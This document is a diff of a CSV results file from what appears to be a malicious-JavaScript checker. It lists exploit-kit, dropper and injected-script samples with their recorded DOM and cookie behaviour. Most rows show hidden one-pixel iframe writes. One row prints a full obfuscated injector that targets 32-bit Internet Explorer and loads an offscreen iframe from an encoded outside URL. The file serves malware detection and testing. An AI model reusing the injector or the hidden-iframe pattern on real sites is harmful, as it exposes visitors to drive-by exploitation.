@@ -1,19 +1,34 @@
 SITE,HOST_URL,THIRD_URL,COOKIE_GET,COOKIE_SET,DOM,DOM_INFO,NET,REQUEST_URL
-host.com:3001,"http://host.com:3001/taskPermission/scriptChecker/malicious-set/run.html",/angler/12/deobfuscated_injection.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/12/jquery_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160211/2016-02-11-www.pdcmemphis.com-wp-emoji-releae_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160212/2016-02-15-page-from-waterfrontsouthgate.com.au_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160222/2016-02-22-js-from-compromised-website-skinnymom.com-edd-checkout-global.min.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160222/2016-02-22-js-from-compromised-website-skinnymom.com-zlrecipe_print.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160229/2016-02-29-js-file-from-sushifaq.com-wp-emoji-release.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-bootstrap.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-caption_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-core_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-engine.mootools_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-jquery-migrate.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-jquery.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-kiwitemplates.com-mootools-core_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/angler/20160302/2016-03-02-page-from-dompetdhuafa.org.au-with-injected-script.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
+host.com:3001,"http://host.com:3001/taskPermission/scriptChecker/malicious-set/run.html",/angler/12/deobfuscated_injection.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/12/jquery_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160211/2016-02-11-www.pdcmemphis.com-wp-emoji-releae_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160212/2016-02-15-page-from-waterfrontsouthgate.com.au_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160222/2016-02-22-js-from-compromised-website-skinnymom.com-edd-checkout-global.min.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160222/2016-02-22-js-from-compromised-website-skinnymom.com-zlrecipe_print.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160229/2016-02-29-js-file-from-sushifaq.com-wp-emoji-release.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-bootstrap.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-caption_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-core_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-engine.mootools_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-jquery-migrate.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-jquery.min_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-kiwitemplates.com-mootools-core_injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/angler/20160302/2016-03-02-page-from-dompetdhuafa.org.au-with-injected-script.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
 ,,/crimepack/iframes/sample9.js,N,N,Y,"Document::write:""Document::write-><iframe name=""nojrserflro"" width=""1"" height=""0"" src=""http://localhost/index.php"" marginwidth=""1"" marginheight=""0"" title=""nojrserflro"" scrolling=""no"" border=""0"" frameborder=""0""></iframe><head />",N,
 ,,/crimepack/iframes/sample90.js,N,N,Y,"Document::write:""Document::write-><iframe name=""yptzjfhcgct"" width=""1"" height=""0"" src=""http://localhost/index.php"" marginwidth=""1"" marginheight=""0"" title=""yptzjfhcgct"" scrolling=""no"" border=""0"" frameborder=""0""></iframe><head />",N,
 ,,/crimepack/iframes/sample900.js,N,N,Y,"Document::write:""Document::write-><iframe name=""tkhtamhwopn"" width=""1"" height=""0"" src=""http://localhost/index.php"" marginwidth=""1"" marginheight=""0"" title=""tkhtamhwopn"" scrolling=""no"" border=""0"" frameborder=""0""></iframe><head />",N,
@@ -1014,9 +1029,19 @@ host.com:3001,"http://host.com:3001/taskPermission/scriptChecker/malicious-set/r
 ,,/crimepack/iframes/sample9897.js,N,N,Y,"Document::write:""Document::write-><iframe name=""trfdcsppaja"" width=""1"" height=""0"" src=""http://localhost/index.php"" marginwidth=""1"" marginheight=""0"" title=""trfdcsppaja"" scrolling=""no"" border=""0"" frameborder=""0""></iframe><head />",N,
 ,,/crimepack/iframes/sample9898.js,N,N,Y,"Document::write:""Document::write-><iframe name=""whmsgalqgtc"" width=""1"" height=""0"" src=""http://localhost/index.php"" marginwidth=""1"" marginheight=""0"" title=""whmsgalqgtc"" scrolling=""no"" border=""0"" frameborder=""0""></iframe><head />",N,
 ,,/crimepack/iframes/sample9899.js,N,N,Y,"Document::write:""Document::write-><iframe name=""nunpickzuam"" width=""1"" height=""0"" src=""http://localhost/index.php"" marginwidth=""1"" marginheight=""0"" title=""nunpickzuam"" scrolling=""no"" border=""0"" frameborder=""0""></iframe><head />",N,
-,,/legitimate-injected/1/injected_code.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
-,,/legitimate-injected/2/injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />",N,
+,,/js-droppers/Bruce_Morton_-_documents.js,N,N,Y,"body:""<body />",N,
+,,/js-droppers/Collin_Richard_-_passport_scans.js,N,N,Y,"body:""<body />",N,
+,,/js-droppers/Invoice_852947.js,N,N,Y,"body:""<body />",N,
+,,/js-droppers/documents_and_passport_scans.js,N,N,Y,"body:""<body />",N,
+,,/legitimate-injected/1/injected_code.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/legitimate-injected/2/injected.js,Y,Y,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->div<head />""
+""body:""<body />",N,
+,,/legitimate-injected/3/deobfuscated.js,N,N,Y,"body:""<body />",N,
+,,/legitimate-injected/3/injected.js,N,N,Y,"body:""<body />",N,
 ,,/misc/2015-07-17-malicious-javascript-from-stepanovichon.com.js,Y,Y,Y,"Document::write:""Document::write-><script language=""javascript"">JOHVLmclsFNy='navigator';evZBxQSsWuf='document';FLCEGNkUdjHW=window;GNtQhiSBEDAR=FLCEGNkUdjHW[evZBxQSsWuf];LVJlbhQAGwN=FLCEGNkUdjHW[JOHVLmclsFNy];var GRxrXclVbnSp=window;var doc=GRxrXclVbnSp.document;function setCookie(name,value,expires){doc.cookie=name+'='+escape(value)+""; expires=""+expires.toGMTString()+""; path=/"";return;}function getCookie(name){var cookie=' '+doc.cookie;var search=' '+name+'=';var setStr=null;var offset = 0;var end = 0;if (cookie.length > 0) {offset = cookie.indexOf(search);if (offset != -1) {offset += search.length;end = cookie.indexOf(';'offset);if (end == -1) {end = cookie.length;}setStr = GRxrXclVbnSp.unescape(cookie.substring(offset, end));}}return setStr;}function ZdoMJDGFUPL(){if(!getCookie(""CIeyOkotgDKVcmfs"")){var expires=new Date();expires.setTime(expires.getTime()+0x5265c00);setCookie(""CIeyOkotgDKVcmfs"",'79998daded6ddd0f14d2ac786dedeb57',expires);return true}else{return false}}function aTbMBrtgpxiF(j7r){var w9,f5h,av,l1,fk;l1='onl'+'oad';av='ad'+'dEv'+'entListe'+'ner';f5h='att'+'achEve'+'nt';w9='DOMCo'+'ntentL'+'oad'+'ed';fk=window;GNtQhiSBEDAR[av]?GNtQhiSBEDAR[av](w9+'',j7r):fk[f5h](l1+'',j7r)}function nWSwtsTUNiOcY(){var qy;qy='user'+'Age'+'nt';return LVJlbhQAGwN[qy]}function qCwZFKjSaYI(y0l,np1){var p7;p7='te'+'st';return y0l[p7](np1)}function haHExLmofXCiW(){var fq;fq=nWSwtsTUNiOcY();return qCwZFKjSaYI(/Win64;/i,fq)||qCwZFKjSaYI(/x64;/i,fq)}function CUjwmVBZGTEp(){var ai,be;be=(/Trident/i);ai=nWSwtsTUNiOcY();if(!qCwZFKjSaYI(be,ai)){return 0}else{return true}}function eUKzOquWidBPD(){var t55sd,u0u,l2,gas,dis,qt7,y1,od66s,hia,ydh3,mbs,cun,ljjd3d,ffa;od66s='\u0073'+'\u0072\u0063';y1='\u0069'+'\u0066\u0072\u0061\u006d\u0065';u0u='\u0063'+'\u0073\u0073\u0054\u0065\u0078\u0074';l2='\u0067'+'\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0073\u0042\u0079\u0054\u0061\u0067\u004e\u0061\u006d\u0065';cun='\u0062'+'\u006f\u0064\u0079';qt7='\u0077'+'\u0069\u0064\u0074\u0068';hia='\u0068'+'\u0065\u0069\u0067\u0068\u0074';ffa='\u0061'+'\u0070\u0070\u0065\u006e\u0064\u0043\u0068\u0069\u006c\u0064';gas='\u0063'+'\u0072\u0065\u0061\u0074\u0065\u0045\u006c\u0065\u006d\u0065\u006e\u0074';dis='\u0073'+'\u0074\u0079\u006c\u0065';mbs='\u0031'+'\u0030';if(ZdoMJDGFUPL()&&CUjwmVBZGTEp()&&!haHExLmofXCiW()){t55sd=mbs;udh3='\u0070\u006f'+'\u0073\u0069'+'\u0074\u0069\u006f\u006e'+'\u003a\u0061\u0062\u0073'+'\u006f\u006c\u0075'+'\u0074\u0065\u003b\u006c\u0065\u0066\u0074'+'\u003a\u002d\u0031\u0036\u0031'+'\u0030\u0070\u0078'+'\u003b\u0074\u006f\u0070'+'\u003a\u002d\u0031\u0036'+'\u0033\u0037\u0070\u0078';ljjd3d=GNtQhiSBEDAR[gas](y1);ljjd3d[qt7]=t55sd;ljjd3d[hia]=t55sd;ljjd3d[dis][u0u]=udh3;ljjd3d[od66s]='\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006e\u0064\u0073\u006f\u0072\u0065'+'\u0073\u0074\u006f\u002e\u006c\u0069\u006e\u006b\u002f\u0051\u0045\u0042\u0051\u0041'+'\u006b\u006f\u0049\u0053\u0031\u0041\u0049\u0055\u006b\u0056\u0057\u0052\u0056\u0051'+'\u0056\u0051\u006c\u006b\u0058\u0057\u0031\u0067\u0049\u0058\u0051\u002e\u0068\u0074'+'\u006d\u006c';GNtQhiSBEDAR[l2](cun)[0][ffa](ljjd3d)}}aTbMBrtgpxiF(eUKzOquWidBPD);</script>, <head />",N,
 ,,/misc/2015-07-17-malicious-javascript-from-stepanovichon.com_deobfuscated.js,Y,Y,N,,N,
-,,/misc/seo_poisoning_1.js,N,N,Y,"Document::write:""Document::write-><style undefined>.dnn{position:absolute;top:-9999px}</style><head />",N,
-,,/misc/site-130746.js,N,N,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->iframe<head />",N,
+,,/misc/seo_poisoning_1.js,N,N,Y,"Document::write:""Document::write-><style undefined>.dnn{position:absolute;top:-9999px}</style><head />""
+""body:""<body />",N,
+,,/misc/site-130746.js,N,N,Y,"Document::CreateElementForBinding:""Document::CreateElementForBinding->iframe<head />""
+""body:""<body />",N,
